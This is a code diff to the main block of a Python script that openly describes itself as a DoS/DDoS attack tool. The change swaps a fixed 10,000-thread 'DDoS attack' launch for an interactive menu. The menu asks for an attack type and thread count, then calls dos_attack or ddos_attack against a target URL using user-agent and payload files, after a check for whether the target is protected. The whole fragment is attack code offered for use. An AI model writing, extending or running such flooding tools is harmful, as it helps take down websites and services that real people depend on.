@@ -81,8 +81,19 @@ if __name__ == "__main__":
     payloads_file = "Payloads.txt"  # File containing payloads
     
     if check_protection(target_url):
-        num_threads = 10000  # Number of threads for DDoS attack
-        print(f"Launching DoS attack with {num_threads} threads on {target_url}...")
-        ddos_attack(target_url, num_threads, user_agents_file, payloads_file)
+        attack_type = input("Select attack type:\n1. DoS Attack\n2. DDoS Attack\nEnter attack type (1 or 2): ")
+        
+        if attack_type == "1":
+            num_threads = int(input("Enter number of threads for DoS attack: "))
+            dos_attack(target_url, random.choice(user_agents), random.choice(payloads))
+        
+        elif attack_type == "2":
+            num_threads = int(input("Enter number of threads for DDoS attack: "))
+            print(f"Launching DDoS attack with {num_threads} threads on {target_url}...")
+            ddos_attack(target_url, num_threads, user_agents_file, payloads_file)
+        
+        else:
+            print("Invalid attack type. Please enter 1 or 2.")
+    
     else:
         print("Target is not vulnerable or unreachable.")
